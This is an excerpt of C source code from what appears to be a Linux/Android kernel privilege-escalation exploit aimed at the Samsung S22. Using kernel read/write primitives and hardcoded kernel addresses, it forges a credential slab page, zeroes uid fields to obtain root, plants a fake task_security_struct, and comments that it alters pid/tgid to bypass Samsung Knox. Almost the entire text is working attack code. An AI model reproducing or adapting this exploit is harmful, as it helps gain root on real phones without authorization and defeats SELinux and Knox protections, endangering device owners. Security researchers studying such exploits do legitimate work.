...
unsigned long virt_to_head_page(unsigned long addr) {
  addr = addr & 0xfffffffffffff000ul;
  unsigned long page =  0xffffffff00000000ul + (((addr - 0xffffc008000000ul)>> 6) & 0xffffffff); 
  return page;
}
...
// #define CRASH
  ...
  // samsung s22
  // ffffffc011e4dd40 init_task
  // ffffffc011c76020 init_cred
  // ffffffc0119e8de8 anon_pipe_buf_ops
  ...
  unsigned long selinux = read64(selinux_state);
  printf("selinux state %lx\n", selinux);
  ...
  read_mem(cred, mem, 0x200);

  // check relations
  unsigned long cred_page = virt_to_head_page(cred);
  unsigned long cred_jar_ro_content = read64(cred_jar_ro);
  printf("cred page is at %lx\n", cred_page);
  printf("slab addr at %lx\n", read64(cred_page+0x18));
  printf("cred jar ro at %lx\n", cred_jar_ro);
  printf("cred jar ro content is %lx\n", cred_jar_ro_content);
  read_mem(cred_page, mem, 0x40);
  DumpHex(mem, 0x40);
  assert(read64(cred_page+0x18) == cred_jar_ro_content);

  unsigned long sec = read64(cred+0x78);
  assert(read64(sec+24) == (unsigned long)cred);
  assert(read64(cred+0xb0) == current_task);
  printf("check passed\n");

  // make this as a slab page of cred jar ro
  write64(page+0x18, cred_jar_ro_content);
  printf("page tampered\n");

  // set uid 0
  memset((char *)mem+4, 0, 0x30-4);

  // set security
  *(unsigned long *)((char*)mem+0x78) = page_address(page) + 0x100;

  // copy cred to our page
  write_mem(page_address(page), mem, 0x100);

  // prepare security
  struct task_security_struct {
    uint32_t suid[6];
    unsigned long bp_cred;
  };

  struct task_security_struct security;
  memset(&security, 0, sizeof(security));
  security.bp_cred = page_address(page);

  // copy security to page
  write_mem(page_address(page)+0x100, (void *)&security, sizeof(security));

  // change pid and tgid to bypass knox
